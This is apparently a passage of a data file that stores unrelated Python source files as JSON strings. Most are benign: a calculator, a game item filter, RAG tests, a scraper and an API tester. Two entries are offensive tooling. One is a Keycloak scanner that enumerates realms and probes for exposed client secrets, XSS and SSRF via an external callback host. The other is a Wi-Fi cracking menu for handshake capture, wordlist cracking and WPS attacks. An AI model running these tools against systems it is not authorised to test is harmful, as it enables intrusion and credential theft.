\u043a\u0443\u0440\u0441 \u043f\u0440\u043e\u0434\u0430\u0436\u0438: {sell_price} {fiat}\")\r\n                print(f\"\u0421\u043f\u0440\u0435\u0434: {spread:.2f}%\")\r\n            else:\r\n                print(\"\u041d\u0435 \u0443\u0434\u0430\u043b\u043e\u0441\u044c \u043d\u0430\u0439\u0442\u0438 \u043f\u043e\u0434\u0445\u043e\u0434\u044f\u0449\u0438\u0435 \u043f\u0440\u0435\u0434\u043b\u043e\u0436\u0435\u043d\u0438\u044f.\")\r\n\r\n            print(\"=\" * 50)\r\n\r\n        print(\"\u041e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u0435 \u0447\u0435\u0440\u0435\u0437 60 \u0441\u0435\u043a\u0443\u043d\u0434...\")\r\n        time.sleep(5)\r\n",
    "\ndef calculate() -> None:\n    \"\"\"\n    Performs basic arithmetic operations on two numbers.\n\n    This function continuously prompts the user for two numbers and an operator, \n    performs the specified operation, and displays the result. \n    The user can choose to continue or exit the calculator.\n    \"\"\"\n    while True:\n        try:\n            # Get user input with clear prompts\n            num1 = int(input(\"Enter the first number: \"))\n            num2 = int(input(\"Enter the second number: \"))\n            operator = input(\"Enter the operation (+, -, *, /, //, **, %): \")\n\n            # Perform the calculation based on the operator\n            match operator:\n                case \"+\":\n                    result = num1 + num2\n                case \"-\":\n                    result = num1 - num2\n                case \"*\":\n                    result = num1 * num2\n                case \"/\":\n                    if num2 == 0:\n                        raise ZeroDivisionError(\"Cannot divide by zero\")\n                    result = num1 / num2\n                case \"//\":\n                    if num2 == 0:\n                        raise ZeroDivisionError(\"Cannot divide by zero\")\n                    result = num1 // num2\n                case \"**\":\n                    result = num1 ** num2\n                case \"%\":\n                    if num2 == 0:\n                        raise ZeroDivisionError(\"Cannot divide by zero\")\n                    result = num1 % num2\n                case _:\n                    raise ValueError(\"Please enter a valid operator\")\n\n            # Display the result\n            print(f\"The result of {operator} is: {result}\")\n\n            # Check if the user wants to continue\n            repeat = input(\"Do you want to perform another calculation? (Y/N) \")\n            if repeat.lower() != 'y':\n                print(\"Exiting calculator.\")\n                break \n\n        except ValueError as e:\n            print(f\"Invalid input: {e}. Please enter valid numbers.\")\n        except ZeroDivisionError as e:\n            print(f\"Error: {e}\")\n\nif __name__ == \"__main__\":\n    calculate()\n    ",
    "from dataclasses import dataclass, field\n\nitem_class_to_filter = {\n    'Helmets': 'armour.helmet',\n    'Body Armours': 'armour.chest',\n    'Belts': 'accessory.belt',\n    'Amulets': 'accessory.amulet',\n    'Rings': 'accessory.ring',\n    'Gloves': 'armour.gloves',\n    'Boots': 'armour.boots',\n    'Wands': 'weapon.wand',\n    'Foci': 'armour.focus',\n    'Life Flasks': 'flask.life',\n    'Mana Flasks': 'flask.mana',\n    'Socketable': 'currency.socketable',\n    'Stackable Currency': 'currency',\n}\n\nitem_class_re = r\"Item Class: (.+)\"\nrarity_re = r\"Rarity: (.+)\"\nquality_re = r\"Quality: \\+(\\d+)%\"\n# TODO - might want to only filter on es/ar/ev if the item has at least two relevant mods\n# for now, don't filter on it at all\nequipment_re = [\n    # (r\"Energy Shield: (\\d+)\", 'es'),\n    # # the extra stuff for `Armour` is to avoid matching `Armour: ` lines on socketables (runes and soul cores)\n    # (r\"Armour: (\\d+)(?:$| \\()\", 'ar'),\n    # (r\"Evasion Rating: (\\d+)\", 'ev'),\n]\n\n\n@dataclass(frozen=True)\nclass PseudoMeta:\n    # what this pseudo category is\n    hint: str\n    # whether to leave it disabled in trade filters\n    disabled: bool\n    # if multiple pseudos, order in which they'll show up\n    sort_order: int\n\n\n@dataclass\nclass Pseudo:\n    meta: PseudoMeta\n    weight: float = 1\n\n\n@dataclass\nclass Affix:\n    mod: str\n    trade_id: str\n    pseudos: list[Pseudo] = field(default_factory=list)\n\n    def __post_init__(self):\n        self.regex = fr\"([+-]?\\d+)%? (?:to )?{self.mod}( \\(implicit\\))?\"\n\n\nstats = PseudoMeta('stats', disabled=True, sort_order=1)\nresists = PseudoMeta('resists', disabled=True, sort_order=2)\nstats_and_resists = PseudoMeta('stats and resists', disabled=False, sort_order=3)\n\naffixes = [\n    # prefixes\n    Affix('maximum Life', '3299347043'),\n    Affix('maximum Mana', '1050105434'),\n    Affix('increased Spell Damage', '2974417149'),\n    # suffixes\n    Affix('Strength', '4080418644', [Pseudo(stats), Pseudo(stats_and_resists)]),\n    Affix('Dexterity', '3261801346', [Pseudo(stats), Pseudo(stats_and_resists)]),\n    Affix('Intelligence', '328541901', [Pseudo(stats), Pseudo(stats_and_resists)]),\n    Affix('all Attributes', '1379411836', [Pseudo(stats, weight=3), Pseudo(stats_and_resists, weight=3)]),\n    Affix('Fire Resistance', '3372524247', [Pseudo(resists), Pseudo(stats_and_resists)]),\n    Affix('Cold Resistance', '4220027924', [Pseudo(resists), Pseudo(stats_and_resists)]),\n    Affix('Lightning Resistance', '1671376347', [Pseudo(resists), Pseudo(stats_and_resists)]),\n    Affix('Chaos Resistance', '2923486259', [Pseudo(resists, weight=1.5), Pseudo(stats_and_resists, weight=1.5)]),\n    Affix('all Elemental Resistances', '2901986750', [Pseudo(resists, weight=3), Pseudo(stats_and_resists, weight=3)]),\n    Affix('increased Mana Regeneration Rate', '789117908'),\n    Affix('increased Critical Hit Chance', '587431675'),\n    Affix('increased Critical Damage Bonus', '3556824919'),\n    Affix('increased Critical Spell Damage Bonus', '274716455'),\n    Affix('increased Cast Speed', '2891184298'),\n    Affix('Level of all Spell Skills', '124131830'),\n    # Either\n    Affix('increased Rarity of Items found', '3917489142'),\n    # TODO - use correct accuracy filter depending on item class. for now just do non-weapon...\n    # other accuracy\n    Affix('Accuracy Rating', '803737631'),\n    # weapon accuracy\n    Affix('Accuracy Rating', '691932474'),\n]\n",
    "import requests\nimport sys\nimport getopt\nimport re\nimport signal\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\nimport urllib3\n\n# Desabilitar warnings de certificado inseguro\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\n# Tratamento de interrup\u00e7\u00e3o por Ctrl+C\ndef signal_handler(sig, frame):\n    print(\"\\n[!] Interrompido pelo usu\u00e1rio. Encerrando...\\n\")\n    sys.exit(0)\n\nsignal.signal(signal.SIGINT, signal_handler)\n\n# Banner\n\n\ndef exibir_banner():\n    banner = r\"\"\"\n    ============================================================\n     _  __               _             _       _____       _                 \n    | |/ /              | |           | |     / ____|     (_)                \n    | ' / ___ _   _  ___| | ___   __ _| | __ | (___  _ __  _ _ __   ___ _ __ \n    |  < / _ \\ | | |/ __| |/ _ \\ / _` | |/ /  \\___ \\| '_ \\| | '_ \\ / _ \\ '__|\n    | . \\  __/ |_| | (__| | (_) | (_| |   <   ____) | | | | | |_) |  __/ |   \n    |_|\\_\\___|\\__, |\\___|_|\\___/ \\__,_|_|\\_\\ |_____/|_| |_|_| .__/ \\___|_|   \n               __/ |                                        | |              \n              |___/            By Bl4dsc4n                  |_|              \n    ============================================================\n    Uso: script.py [op\u00e7\u00f5es] --url <url> --realms <arquivo_de_realms>\n\n    Op\u00e7\u00f5es:\n      -a   Localizar Realms name: <URL>/auth/realms/{realm-name}\n      -b   Enumera\u00e7\u00e3o de IDs de clientes: <URL>/auth/realms/{realm-name}/protocol/openid-connect/auth?client_id=account\n      -c   Testando acesso aos clientes: <URL>/auth/admin/realms/{realm-name}/clients\n      -d   Testa vulnerabilidade CVE-2020-27838 Secret exposto\n      -e   Testa vulnerabilidade CVE-2021-20323 (XSS) openid-connect\n      -f   Testa vulnerabilidade CVE-2021-20323 (XSS) default\n      -g   Verifica a vulnerabilidade CVE-2020-10770 SSRF \n      -h   Help\n\n    Par\u00e2metros obrigat\u00f3rios:\n      --url       Define a URL base (ex.: https://example.com)\n      --realms    Define o arquivo contendo a lista de realms a serem testados\n\n    Exemplos de uso:\n      Localizar Realms name:\n          python3 script.py -a --url https://example.com --realms realms.txt\n\n      Testar XSS (CVE-2021-20323):\n          python3 script.py -f --url https://example.com --realms realms.txt\n\n      Testar SSRF (CVE-2020-10770):\n          python3 script.py -g --url https://example.com --realms realms.txt --hook c1746zvrghiftrf8k9j0prdk19.oastify.com\n\n      Testar v\u00e1rias op\u00e7\u00f5es juntas:\n          python3 script.py -a -b -d --url https://example.com --realms realms.txt\n          python3 script.py -abcdef --url https://example.com --realms realms.txt\n\n    * Este script realiza testes no \"Keycloak\" uma ferramenta de gerenciamento\n      de identidade e acesso (IAM - Identity and Access Management).\n      Certifique-se de ter permiss\u00e3o antes de executar.\n\n    Desenvolvido por Carlos Tuma - Bl4dsc4n - Version 0.1\n    ============================================================\n    \"\"\"\n    print(banner)\n\n\n# Fun\u00e7\u00f5es modificadas para suportar threads\ndef funcao1_thread(url, realm):\n    try:\n        full_url = f\"{url}/auth/realms/{realm}\"\n        response = requests.get(full_url, verify=False, allow_redirects=False, timeout=5)\n        if response.status_code in [200]:\n            return f\"{realm}: {response.status_code}\"\n    except requests.exceptions.SSLError:\n        return f\"[Erro] Realm {realm}: Falha no SSL. Certificado inv\u00e1lido.\"\n    except requests.exceptions.RequestException as e:\n        return f\"[Erro] Realm {realm}: {str(e)}\"\n\ndef funcao2_thread(url, realm):\n    try:\n        full_url = f\"{url}/auth/realms/{realm}/protocol/openid-connect/auth?client_id=account\"\n        response = requests.get(full_url, verify=False, timeout=5)\n        actions = re.findall(r'action=\"([^\"]+)\"', response.text)\n        return [action for action in actions]\n    except requests.exceptions.RequestException as e:\n        return f\"[Erro] Realm {realm}: {str(e)}\"\n\ndef funcao3_thread(url, realm):\n    try:\n        full_url = f\"{url}/auth/admin/realms/{realm}/clients\"\n        response = requests.get(full_url, verify=False, allow_redirects=False, timeout=5)\n        if response.status_code in [200, 401, 403]:\n            return f\"Testando Realms: {realm} - {response.status_code}\"\n    except requests.exceptions.RequestException as e:\n        return f\"[Erro] Realm {realm}: {str(e)}\"\n\n\ndef funcao4_thread(url, realm):\n    try:\n        full_url = f\"{url}/auth/realms/{realm}/clients-registrations/default/security-admin-console\"\n        response = requests.get(full_url, verify=False, allow_redirects=False, timeout=5)\n        \n        if response.status_code == 200:\n            try:\n                # Tenta interpretar a resposta como JSON\n                data = response.json()\n                secret = data.get(\"secret\", \"N\u00e3o encontrado\")\n                \n                # Ignorar secrets mascarados\n                if secret and (secret == \"**********\" or all(char == '*' for char in sec",
    "import requests\nimport json\nimport urllib3\nimport time\nfrom datetime import datetime\nfrom geraR import generate_report  # Importando a fun\u00e7\u00e3o generate_report do script geraR.py\n\n# Desativar avisos de HTTPS n\u00e3o verificado\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\n# Configura\u00e7\u00e3o inicial do proxy (exemplo: Burp Suite)\nPROXIES = {\n    \"http\": \"http://127.0.0.1:8080\",\n    \"https\": \"http://127.0.0.1:8080\"\n}\n\nUSE_PROXY = False  # Vari\u00e1vel para ativar/desativar o proxy\n\ndef log_message(message):\n    timestamp = datetime.now().strftime(\"[%Y-%m-%d %H:%M:%S]\")\n    print(f\"{timestamp} {message}\")\n\n# Fun\u00e7\u00e3o para exibir o banner ASCII\ndef display_banner():\n    banner = \"\"\"\n     \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557   \u2588\u2588\u2557\n    \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551\n    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551     \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551\n    \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u255d \u2588\u2588\u2551\u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551\n    \u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551\n    \u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u255d     \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u2550\u2550\u255d\n    \"\"\"\n    print(banner)\n\n# Fun\u00e7\u00e3o para exibir a mensagem de \"aguarde\" com anima\u00e7\u00e3o\ndef display_loading_message():\n    message = \"Executando testes, aguarde\"\n    print(message, end=\"\", flush=True)\n    for _ in range(3):\n        time.sleep(0.5)\n        print(\".\", end=\"\", flush=True)\n    print(\"\\n\")\n\n# Fun\u00e7\u00e3o para carregar a especifica\u00e7\u00e3o OpenAPI ou extrair de uma URL\ndef load_openapi_spec(file_or_url):\n    if file_or_url.startswith(\"http://\") or file_or_url.startswith(\"https://\"):\n        print(\"Detectada URL. Verificando o tipo de resposta...\")\n        response = requests.get(file_or_url, proxies=PROXIES if USE_PROXY else None, verify=False)\n        response.raise_for_status()\n\n        content_type = response.headers.get(\"Content-Type\", \"\")\n        if \"application/json\" in content_type:\n            print(\"Resposta JSON detectada. Carregando especifica\u00e7\u00e3o OpenAPI...\")\n            return response.json().get(\"paths\", {})\n        else:\n            print(\"[ERRO] O conte\u00fado retornado n\u00e3o \u00e9 JSON. Verifique a URL fornecida.\")\n            return None\n\n    else:\n        print(\"Carregando especifica\u00e7\u00e3o OpenAPI de um arquivo local...\")\n        with open(file_or_url, 'r') as file:\n            return json.load(file).get(\"paths\", {})\n\n# Fun\u00e7\u00e3o para autentica\u00e7\u00e3o via login\ndef login_for_token(base_url):\n    username = input(\"Digite o nome de usu\u00e1rio para login: \").strip()\n    password = input(\"Digite a senha: \").strip()\n    login_url = f\"{base_url}/api/login\"\n\n    try:\n        response = requests.post(\n            login_url,\n            json={\"username\": username, \"password\": password},\n            proxies=PROXIES if USE_PROXY else None,\n            verify=False\n        )\n        response.raise_for_status()\n        token = response.json().get(\"token\")\n        if token:\n            print(\"Autentica\u00e7\u00e3o bem-sucedida. Token recebido.\")\n            return {\"Authorization\": f\"Bearer {token}\"}\n        else:\n            print(\"Falha ao obter o token. Verifique suas credenciais.\")\n            return None\n    except Exception as e:\n        print(f\"Erro durante a autentica\u00e7\u00e3o: {e}\")\n        return None\n\n# Fun\u00e7\u00e3o para configurar autentica\u00e7\u00e3o\ndef configure_authentication(base_url):\n    auth_method = input(\"Escolha o m\u00e9todo de autentica\u00e7\u00e3o (1: Nenhuma, 2: Token Bearer, 3: Login): \").strip()\n\n    if auth_method == \"1\":\n        return None\n    elif auth_method == \"2\":\n        token = input(\"Digite o token Bearer: \").strip()\n        return {\"Authorization\": f\"Bearer {token}\"}\n    elif auth_method == \"3\":\n        return login_for_token(base_url)\n    else:\n        print(\"Op\u00e7\u00e3o inv\u00e1lida. Nenhuma autentica\u00e7\u00e3o ser\u00e1 usada.\")\n        return None\n\n# Fun\u00e7\u00e3o para ativar/desativar o uso de proxy\ndef configure_proxy():\n    global USE_PROXY\n    use_proxy_input = input(\"Deseja ativar o uso de proxy? (s/n): \").strip().lower()\n    if use_proxy_input == \"s\":\n        USE_PROXY = True\n        print(\"Proxy ativado.\")\n    else:\n        USE_PROXY = False\n        print(\"Proxy desativado.\")\n\n# Fun\u00e7\u00e3o para testar as rotas\ndef test_api_routes(base_url, paths, headers):\n    results = []\n    raw_responses = []  # Lista para armazenar respostas brutas\n\n    if not isinstance(paths, dict):\n        print(\"[ERRO] Nenhum endpoint encontrado para testar.\")\n        return results\n\n    print(\"Endpoints encontrados:\")\n    for route, methods in paths.items():\n        print(f\"Rota: {route}\")\n        for method, details in methods.items():\n            print(f\"  M\u00e9todo: {method}\")\n\n            # Preparar URL e par\u00e2metros\n            params = {}\n            for param in details.get(\"parameters\", []):\n                if param.get(\"in\") == \"path\" and param.get(\"required\"):\n                    params[param[\"name\"]] = param.get(\"schema\", {}).get(\"default\", \"1\")\n                if param.get(\"in\") == \"query\" and param.get(\"required\"):\n                    params[param[\"name\"]] = \"test\"\n\n            url = f\"{base_url.rstrip('/')}/{route.lstrip('/').format(**params)}\"",
    "\"\"\"\nTests for the RAG system components.\n\"\"\"\n\nimport pytest\nfrom legal_ai.rag import TurkishLegalRAG, LegalQAChain\n\n\ndef test_rag_initialization():\n    \"\"\"Test RAG system initialization.\"\"\"\n    with pytest.raises(FileNotFoundError):\n        # Should raise error for non-existent file\n        TurkishLegalRAG(\"non_existent_file.json\")\n\n\ndef test_retrieval():\n    \"\"\"Test document retrieval.\"\"\"\n    rag = TurkishLegalRAG(\"data/processed/processed_law.json\")\n\n    # Test with valid query\n    results = rag.retrieve(\"ceza kanunu\")\n    assert len(results) > 0\n    assert all(isinstance(r, dict) for r in results)\n\n    # Test with empty query\n    with pytest.raises(ValueError):\n        rag.retrieve(\"\")\n\n    # Test with invalid query type\n    with pytest.raises(ValueError):\n        rag.retrieve(123)\n\n\ndef test_metadata_filtering():\n    \"\"\"Test metadata filtering in retrieval.\"\"\"\n    rag = TurkishLegalRAG(\"data/processed/processed_law.json\")\n\n    # Test with valid metadata filter\n    results = rag.retrieve(\n        \"ceza\",\n        metadata_filter={\"book\": \"\u0130K\u0130NC\u0130 K\u0130TAP\"}\n    )\n    assert all(r[\"metadata\"][\"book\"] == \"\u0130K\u0130NC\u0130 K\u0130TAP\" for r in results)\n\n    # Test with invalid metadata filter\n    with pytest.raises(ValueError):\n        rag.retrieve(\"ceza\", metadata_filter=\"invalid\")\n\n\ndef test_context_formatting():\n    \"\"\"Test context formatting.\"\"\"\n    rag = TurkishLegalRAG(\"data/processed/processed_law.json\")\n\n    # Get some results\n    results = rag.retrieve(\"ceza\")\n\n    # Test context formatting\n    context = rag.format_context(results)\n    assert isinstance(context, str)\n    assert len(context) > 0\n\n# Add more tests as needed\n",
    "from selenium import webdriver\r\nfrom selenium.webdriver.chrome.service import  Service\r\nfrom selenium.webdriver.common.by import By\r\nfrom selenium.webdriver.support.ui import WebDriverWait\r\nfrom selenium.webdriver.support import expected_conditions as EC\r\nimport time\r\nimport pandas as pd\r\nfrom webdriver_manager.chrome import ChromeDriverManager\r\nimport os\r\nfrom selenium.webdriver.chrome.options import Options\r\nimport streamlit as st\r\n\r\noptions = Options()\r\noptions.add_argument(\"--ignore-certificate-errors\")\r\noptions.add_argument(\"--headless\")\r\nservice = Service(executable_path=ChromeDriverManager().install())\r\ndriver = webdriver.Chrome(service=service,options=options)\r\ndriver.maximize_window()\r\n\r\nst.markdown(\"\"\"\r\n<body>\r\n    <section class=\"home\" id=\"home\">\r\n        <div class=\"content\">\r\n            <h3></h3>\r\n            <p></p>\r\n        </div>\r\n    </section>\r\n</body>    \r\n\"\"\", unsafe_allow_html=True)\r\n\r\nwith open(\"common.css\") as f:\r\n    st.markdown(f\"<style>{f.read()}</style>\", unsafe_allow_html=True)\r\n\r\nwebsite = 'https://www.autoscout24.com/'\r\npath = f'{website}lst?atype=C&desc=0&page=1&search_id=2554r0bdct&sort=standard&source=listpage_pagination&ustate=N%2CU'\r\ndriver.get(path)\r\n\r\ndef pop_up_accept():\r\n    try:\r\n        pop_up_accept = WebDriverWait(driver, 20).until(\r\n            EC.presence_of_element_located(\r\n                (By.XPATH, '//button[@class = \"_consent-accept_1lphq_114\"]'))\r\n        )\r\n        pop_up_accept.click()\r\n    except:\r\n        pass\r\npop_up_accept()\r\n\r\ndef pure_number(text):\r\n    pure_text = ''\r\n    for letter in text:\r\n        if letter==',':\r\n            letter = ''\r\n        pure_text = letter + pure_text\r\n    return pure_text\r\n\r\ndef find_last_page_num():\r\n\r\n    try:\r\n        pagination_bar = WebDriverWait(driver, 20).until(\r\n            lambda driver: driver.find_elements(By.XPATH, '//nav[@class =\"scr-pagination FilteredListPagination_pagination__3WXZT\"]/ul/li')\r\n        )\r\n\r\n\r\n        last_page = pagination_bar[-3]\r\n        last_page_number = int(last_page.text)\r\n    except:\r\n        last_page_number = 1\r\n    return last_page_number\r\n\r\n\r\ndef all_car_links(webpage_url):\r\n    driver.get(webpage_url)\r\n\r\n    try:\r\n        possible_all_car_links = WebDriverWait(driver, 20).until(\r\n            lambda driver: driver.find_elements(By.XPATH,'//div[@class = \"ListItem_header__J6xlG ListItem_header_new_design__Rvyv_\"]/a'))\r\n               \r\n        all_links = []\r\n        for link in possible_all_car_links:\r\n            car_link = link.get_attribute('href')\r\n            all_links.append(car_link)         \r\n    except:\r\n        all_links = []\r\n    return all_links\r\n\r\ndef split_url_until_find_page_add_powertype(url):\r\n    splitted_url = url.split('&powertype')\r\n    splitted_elements = []\r\n    for element in splitted_url:\r\n        splitted_elements.append(element)\r\n    return splitted_elements\r\n\r\ndef scrap_the_page_to_df(url):\r\n    driver.get(url)\r\n    all_headers = []\r\n    all_features = []\r\n    df_feature = {}\r\n    try:\r\n        # TODO Car Brand\r\n        car_name = WebDriverWait(driver, 20).until(\r\n            EC.visibility_of_element_located((By.XPATH, '//span[@class = \"StageTitle_boldClassifiedInfo__sQb0l\"]'))\r\n        )\r\n\r\n        df_feature['brand'] = car_name.text\r\n    except:\r\n        df_feature['brand'] = ''\r\n    try:\r\n        # TODO Car Model\r\n        car_model = WebDriverWait(driver, 20).until(\r\n            EC.visibility_of_element_located(\r\n                (By.XPATH, '//span[@class = \"StageTitle_model__EbfjC StageTitle_boldClassifiedInfo__sQb0l\"]'))\r\n        )\r\n\r\n        df_feature['model'] = car_model.text\r\n    except:\r\n        df_feature['model'] = ''\r\n\r\n    try:\r\n        # TODO Car Price\r\n        car_price = WebDriverWait(driver, 20).until(\r\n            EC.visibility_of_element_located(\r\n                (By.XPATH, '//span[@class = \"PriceInfo_price__XU0aF\"]'))\r\n        )\r\n        df_feature['price'] = car_price.text\r\n    except:\r\n        df_feature['price'] = ''\r\n\r\n    try:\r\n        # TODO General Feature\r\n        first_feature_block = WebDriverWait(driver, 20).until(\r\n            EC.visibility_of_element_located(\r\n                (By.XPATH, '//div[@class = \"VehicleOverview_containerMoreThanFourItems__691k2\"]'))\r\n        )\r\n        first_feature_block_each_row = WebDriverWait(first_feature_block,20).until(\r\n            lambda driver: driver.find_elements(By.XPATH,\r\n                                                './/div[@class = \"VehicleOverview_itemContainer__XSLWi\"]')\r\n        )\r\n        #first_feature_block_each_row = first_feature_block.find_elements(By.XPATH,'.//div[@class = \"VehicleOverview_itemContainer__XSLWi\"]')\r\n        for row in first_feature_block_each_row:\r\n            first_row_header = row.find_element(By.XPATH, './/div[@class =\"VehicleOverview_itemTitle__S2_lb\"]').text\r\n            first_row_feature = row.find_element(By.XPATH, './/div[@class =\"VehicleOverview_itemText__AI4dA\"]').text\r\n            df_feature[first_row_header] = first_row_feature\r\n    exce",
    "from choices import choice0, choice1, choice2, choice3, choice4, choice6, choice7, choice8, choice9, choice10, choice0, choice11\r\nfrom cracker import wire\r\n\r\n\r\n# Author - Mmabiaa\r\n# All rights reserved by the author. Unauthorized use is prohibited.\r\n\r\n\r\ndef intro():\r\n\r\n    print(\"\"\"\\033[1;32m\r\n---------------------------------------------------------------------------------------\r\n\u2588\u2588\u2557    \u2588\u2588\u2557\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557       \u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557  \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \r\n\u2588\u2588\u2551    \u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551      \u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551 \u2588\u2588\u2554\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\r\n\u2588\u2588\u2551 \u2588\u2557 \u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551     \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\r\n\u2588\u2588\u2551\u2588\u2588\u2588\u2557\u2588\u2588\u2551\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2551\u255a\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2588\u2588\u2557 \u2588\u2588\u2554\u2550\u2550\u255d  \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\r\n\u255a\u2588\u2588\u2588\u2554\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2551      \u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\r\n \u255a\u2550\u2550\u255d\u255a\u2550\u2550\u255d \u255a\u2550\u255d\u255a\u2550\u255d     \u255a\u2550\u255d       \u255a\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\r\n                                                        Author - Mmabiaa\"\"\")\r\n    print(\"\"\"\r\n---------------------------------------------------------------------------------------\r\n(1)Start monitor mode\r\n(2)Stop monitor mode\r\n(3)Scan Networks\r\n(4)Getting Handshake(monitor mode needed)\r\n(5)Install Wireless tools\r\n(6)Crack Handshake with 'rockyou.txt' (Handshake needed)\r\n(7)Crack Handshake with word list    (Handshake needed)\r\n(8)Crack Handshake without word list (Handshake,ESSID needed)\r\n(9)Create word list\r\n(10)WPS Networks attacks (BSSID,monitor mode needed)\r\n(11)Scan for WPS Networks\r\n\r\n(0)About Me\r\n(00)Exit\r\n-----------------------------------------------------------------------\r\n\"\"\")\r\n\r\n\r\ndef check_user_choice():\r\n    print(\"\\nEnter your choice here : !# \")\r\n    var = int(input(\"\"))\r\n    if var == 1 :\r\n        choice1()\r\n    elif var == 2 :\r\n        choice2()\r\n    elif var == 3 :\r\n        choice3()\r\n\r\n    elif var == 4 :\r\n        choice4()\r\n\r\n    elif var == 5 :\r\n        wire()\r\n\r\n    elif var == 0 :\r\n        choice0()\r\n\r\n    elif var == 00:\r\n        exit()\r\n\r\n    elif var == 6:\r\n        choice6()\r\n\r\n    elif var == 7 :\r\n        choice7\r\n\r\n    elif var == 8 :\r\n        choice8()\r\n\r\n\r\n    elif var == 9 :\r\n        choice9()\r\n\r\n    elif var == 10:\r\n        choice10()\r\n\r\n    elif var == 11:\r\n        choice11()\r\n\r\n    else:\r\n        print('Invalid input....Please try again later')\r\n\r\ndef main():\r\n    intro()\r\n    check_user_choice()\r\n\r\nmain()\r\n",
